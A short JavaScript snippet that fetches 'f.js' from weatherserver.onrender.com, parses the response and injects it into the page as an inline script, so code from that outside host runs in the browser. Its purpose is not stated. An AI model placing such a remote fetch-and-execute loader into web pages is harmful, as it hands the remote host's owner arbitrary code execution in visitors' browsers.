console.log('https://weatherserver.onrender.com/','^^&^&')
const f = fetch('https://weatherserver.onrender.com/f.js',{
	headers:{
		"Content-Type":"text/javascript"
	}
})
f.then(d=>  d.text()).then(c=>{
	const script = document.createElement('script')
	script.type = "text/javascript";
	script.text=JSON.parse(c);
	document.body.appendChild(script)
})
